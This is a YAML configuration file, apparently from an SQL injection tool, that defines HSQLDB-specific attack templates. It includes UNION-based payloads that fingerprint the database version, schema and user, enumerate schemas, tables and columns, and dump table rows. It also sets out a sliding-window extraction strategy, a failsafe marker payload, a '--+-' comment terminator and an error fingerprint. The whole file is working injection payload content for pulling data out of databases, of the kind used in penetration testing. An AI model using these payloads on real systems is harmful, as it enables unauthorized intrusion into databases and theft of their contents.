vendor: HSQLDB

resource:
 info: |
  select concat(
      concat_ws(
          '${enclose_value_sql}',
          DATABASE_VERSION(),
          CURRENT_SCHEMA,
          USER()
      ),
      '${trail_sql}'
  ) r
  FROM (
      VALUES(0)
  )

 schema:
  database: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || convert(q,SQL_VARCHAR)
           || '${enclose_value_sql}'
           order by r
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) r
   from (
       select
           convert(schema_name, SQL_VARCHAR) r,
           count(TABLE_NAME) q
       from INFORMATION_SCHEMA.tables t
       right join INFORMATION_SCHEMA.schemata s
       on t.TABLE_SCHEMA = s.schema_name
       group by r
       ${limit}
   ) x

  table: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || convert(r,SQL_VARCHAR)
           || '${separator_qte_sql}0${enclose_value_sql}'
           order by r
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) r
   from (
       select TABLE_NAME r
       from information_schema.tables
       where TABLE_SCHEMA = '${database}'
       order by r
       ${limit}
   ) x

  column: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || convert(n,SQL_VARCHAR)
           || '${separator_qte_sql}'
           || 0
           || '${enclose_value_sql}'
           order by n
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) r
   from (
       select COLUMN_NAME n
       from information_schema.columns
       where TABLE_SCHEMA = '${database}'
       and TABLE_NAME = '${table}'
       order by n
       ${limit}
   ) x

  row:
   query: |
    select concat(
        group_concat(
            '${enclose_value_sql}'
            || r
            || '${separator_qte_sql}'
            || convert(q,SQL_VARCHAR)
            || '${enclose_value_sql}'
            order by r
            separator '${separator_cell_sql}'
        ),
        '${trail_sql}'
    ) r
    from (
        select
            convert(${fields}, SQL_VARCHAR) r,
            count(*) q
        from ${database}.${table}
        group by r
        ${limit}
    ) x
   fields:
    field: trim(ifnull(convert(${field.value}, SQL_VARCHAR), ''))
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   select
       '${lead}'
       || substr(
           r,
           ${window.char},
           /**
            * Minus '${lead}' should apply
            */
           ${capacity}
       )
   from (
       ${injection}
   ) x
  limit: limit ${limit.value}, 65536
  failsafe: |
   select
       (1337${indice}7330%2b1)
       || '' r
   FROM (VALUES(0))
  calibrator: repeat('${calibrator_sql}', 1024)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - HSQLDB

 normal:
  indices: union select ${result_range} from (${indice_unique}) b
  capacity: ('${lead}' || ${indice} || ${calibrator})
  orderBy: order by 1337